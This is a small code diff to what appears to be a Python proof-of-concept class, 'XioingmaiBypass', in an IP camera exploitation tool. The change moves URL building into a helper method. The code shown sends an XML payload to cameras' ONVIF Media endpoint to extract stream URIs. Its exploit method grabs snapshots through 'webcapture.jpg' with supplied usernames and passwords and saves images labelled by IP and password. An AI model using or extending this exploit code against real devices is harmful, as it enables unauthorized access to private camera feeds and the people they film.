@@ -50,7 +50,7 @@ class XioingmaiBypass(POCTemplate):
             seen.add(p)
             try:
                 r = self.session.post(
-                    f"http://{ip}:{p}/onvif/Media",
+                    self.url(ip, p, "/onvif/Media"),
                     headers=headers, data=xml_payload,
                     verify=False, timeout=self.config.timeout)
                 if match := re.search(r'<tt:Uri>(.*?)</tt:Uri>', r.text):
@@ -65,7 +65,7 @@ class XioingmaiBypass(POCTemplate):
 
     def exploit(self, results):
         ip, port, product, user, password, name = results
-        url = f"http://{ip}:{port}/webcapture.jpg?command=snap&channel=1&user={user}&password={password}"
+        url = self.url(ip, port, f"/webcapture.jpg?command=snap&channel=1&user={user}&password={password}")
         name = f"{ip}-{port}-{user}-{password}-channel_1.jpg"
         return self._snapshot(url, name)
 
